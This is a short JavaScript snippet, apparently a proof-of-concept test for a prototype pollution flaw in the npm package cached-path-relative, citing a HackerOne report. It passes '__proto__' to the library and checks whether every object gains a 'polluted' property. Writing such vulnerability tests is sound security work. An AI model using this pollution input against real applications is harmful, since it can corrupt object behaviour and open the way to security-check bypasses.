// //https://hackerone.com/reports/390847
// test("prototype pollution in cached-path-relative", () => {
console.log({}.polluted);

  var relative = require("cached-path-relative");
  relative("__proto__", "polluted");

  if({}.polluted != undefined){
    console.log("yes")
  }else{
    console.log(undefined)
  }
  //console.log({}.polluted)
  //expect({}.polluted).not.toBe(undefined);
// });
